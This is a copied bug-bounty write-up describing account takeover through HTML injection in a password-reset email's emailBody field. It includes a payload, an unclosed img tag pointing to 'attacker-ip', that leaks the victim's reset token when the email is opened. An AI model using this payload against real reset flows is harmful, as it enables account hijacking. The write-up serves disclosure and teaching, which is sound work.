---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2019-04-11_unauthenticated-account-takeover-through-http-leak.md
original_filename: 2019-04-11_unauthenticated-account-takeover-through-http-leak.md
title: Unauthenticated Account Takeover Through HTTP Leak
category: documents
detected_topics:
- password-reset
- sso
- xss
- command-injection
- otp
tags:
- imported
- documents
- password-reset
- sso
- xss
- command-injection
- otp
language: en
raw_sha256: 9d811d5dc3f2785a2b5879deb2b2221e67f927b979433db5598e96d4a198a90f
text_sha256: 173aa0bbef5c1764f31b68a1b43c5d202626fef5572fc9ad701074bf2b64156c
ingested_at: '2026-06-28T07:31:59Z'
sensitivity: unknown
redactions_applied: false
---

# Unauthenticated Account Takeover Through HTTP Leak

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2019-04-11_unauthenticated-account-takeover-through-http-leak.md
- Source Type: markdown
- Detected Topics: password-reset, sso, xss, command-injection, otp
- Ingested At: 2026-06-28T07:31:59Z
- Redactions Applied: False
- Raw SHA256: `9d811d5dc3f2785a2b5879deb2b2221e67f927b979433db5598e96d4a198a90f`
- Text SHA256: `173aa0bbef5c1764f31b68a1b43c5d202626fef5572fc9ad701074bf2b64156c`


## Content

---
title: "Unauthenticated Account Takeover Through HTTP Leak"
url: "https://medium.com/@mrnikhilsri/unauthenticated-account-takeover-through-http-leak-33386bb0ba0b"
authors: ["Nikhil (niks) (@niksthehacker)"]
bugs: ["HTML injection", "HTTP Leak", "Account takeover"]
publication_date: "2019-04-11"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 5315
scraped_via: "browseros"
---

# Unauthenticated Account Takeover Through HTTP Leak

Nikhil (niks)
 highlighted

Unauthenticated Account Takeover Through HTTP Leak
Nikhil (niks)
Follow
2 min read
·
Apr 11, 2019

798

6

I used “app” keyword in place of application name as it was private program.

While testing a forget password function, i figured out application sends a post request such as given in following image:

Press enter or click to view image in full size

If you notice the request, emailBody used a template. Lets first test, if we can control this value and try injecting html.

Press enter or click to view image in full size

In above image, I have been sending <a> tag in emailBody and here is what i have got in response:

Press enter or click to view image in full size

As you can see, we can control the emailBody and User’s input used in the email templating is not sanitized (HTML injection). But wait what’s the impact? At this point, i thought to try HTTP Leak to leak the password reset token of a victim.

“HTTP Leak”, its a situation, where a certain combination of HTML elements and attributes cause a request to an external resource to be fired — when it should not (Source)

In order to achieve it, all you need to, use the following payload before [RESET-LINK]

<img src=\"http://attacker-ip/?id=
Press enter or click to view image in full size

and forward this request to server. Now as soon as victim opens the email, the password reset token will be sent to attacker’s IP as shown in image given below:

Press enter or click to view image in full size

Now an attacker can simply reset the password using password reset token and in this way, can takeover any account on application.

This was working with all major email service providers Gmail and Yahoo though its not an issue in them, its just user input in email template isn’t sanitized.

Get Nikhil (niks)’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

Timeline:

8 Jan 2019 — Reported the issue
10 Jan 2019 — Triaged
10 Jan 2019 — Bounty paid

References:

cure53/HTTPLeaks
HTTPLeaks - All possible ways, a website can leak HTTP requests - cure53/HTTPLeaks

github.com
